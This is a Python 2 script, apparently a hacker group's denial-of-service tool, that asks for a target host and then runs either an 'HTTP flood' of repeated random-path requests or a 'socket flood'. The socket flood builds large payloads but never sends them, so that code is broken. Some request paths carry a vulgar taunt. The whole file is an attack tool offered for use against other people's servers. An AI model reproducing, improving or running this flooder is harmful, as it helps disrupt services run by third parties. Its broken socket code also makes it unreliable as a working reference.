import colorama, urllib2, random, sys, socket, subprocess, time
from blessings import Terminal
def _init():
	def _main():
		colorama.init()
		color = Terminal()
		subprocess.Popen("clear", shell=True)
		time.sleep(1)
		print color.red("     ___   __  ___")
		print color.green("    |   \ /  \/ __|")
		print color.cyan("    | |) | () \__ .")
		print color.blue("    |___/ \__/|___/")
		print ""
		print color.blue("  By T34CH3R HackTeam")
		print color.cyan("  ---------------------------------")
                print color.cyan("  Please select a type of attack...")
		print color.red("  1:")+color.cyan("Sockets Flood (Power)")
		print color.red("  2:")+color.cyan("HTTP Flood (Weak)")
		a = raw_input("  >")
		if a == "1":
			_sock_flood()
		elif a == "2":
			_http_flood()
		else:
			sys.exit(1)
	def _sock_flood():
		colorama.init()
		color = Terminal()
		protocol = raw_input(color.cyan("  [Enter the target protocol (http:// or https:// or ftp://):"))
		target = raw_input(color.cyan("  [Enter the target host:"))
		requests = raw_input(color.cyan("  [Enter the requests count:"))
		power = raw_input(color.cyan("  [Enter the 'one' payload length:"))
		t = urllib2.urlopen(protocol+target)
		print "  ["+color.green("> ")+"]"+color.blue("Target host: ")+color.red(target)
		print "  ["+color.green("> ")+"]"+color.blue("Target server: ")+color.red(t.info()['server'])
		print "  ["+color.green("> ")+"]"+color.blue("Requests count: ")+color.red(requests)
		print "  ["+color.green("> ")+"]"+color.blue("Power: ")+color.red(power)
		d = raw_input(color.red("  [Please key 'enter' to continue..."))
		i = 1
		p = int(power)*10000
		print "  ["+color.red("! ")+"]"+color.green("Attacking!!!")
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			sock.connect((target, 80))
		except:
			print "  ["+color.red("e ")+"]"+color.cyan("Error of connecting to the host "+target+":80")
			sys.exit(1)
		while (i <= int(requests)):
			payload = "A"*p
			print "  ["+color.blue("> ")+"]"+color.blue("Sending packet number: ")+color.red(str(i))+color.green(" Payload length: "+str(len(payload)))	
			i += 1
			if i > int(requests):
				print "  ["+color.red("< ")+"]"+color.green("Done.")
				time.sleep(5)
				_main()		
	def _http_flood():
		colorama.init()
		color = Terminal()
		protocol = raw_input(color.cyan("  [Enter the target protocol (http:// or https:// or ftp://):"))
		target = raw_input(color.cyan("  [Enter the target host:"))
		requests = raw_input(color.cyan("  [Enter the requests count:"))
		t = urllib2.urlopen(protocol+target)
		print "  ["+color.green("> ")+"]"+color.blue("Target host: ")+color.red(target)
		print "  ["+color.green("> ")+"]"+color.blue("Target server: ")+color.red(t.info()['server'])
		print "  ["+color.green("> ")+"]"+color.blue("Requests count: ")+color.red(requests)
		d = raw_input(color.red("  [Please key 'enter' to continue..."))
		i = 1
		print "  ["+color.red("! ")+"]"+color.green("Attacking!!!")
		while (i <= int(requests)):
			teacher = [
			"T34CH3R.Has.You@! ",
			"Suck.My.Dick.Babe!",
			"Megalodon.has.you ",
			"This.is.payload.: "
			          ]
			resp = random.choice("ZXCVBNMASDFGHJKLQWERTYUIOP")+"/#"+random.choice("ZXCVBNMASDFGHJKLQWERTYUIOP")+"/#"+random.choice(teacher)
			g = urllib2.urlopen(protocol+target+"/#"+resp).read()
			print "  ["+color.blue("> ")+"]"+color.red("Sending request: ")+color.cyan(str(i))+color.red(" -> ")+color.cyan(target+"/#"+resp)+color.blue(" Payload length: ")+color.red(str(len(g)))+color.blue(" bytes...")
			i += 1
			if i > int(requests):
				print "  ["+color.red("< ")+"]"+color.green("Done.")
				time.sleep(5)
				_main()
	_main()
_init()
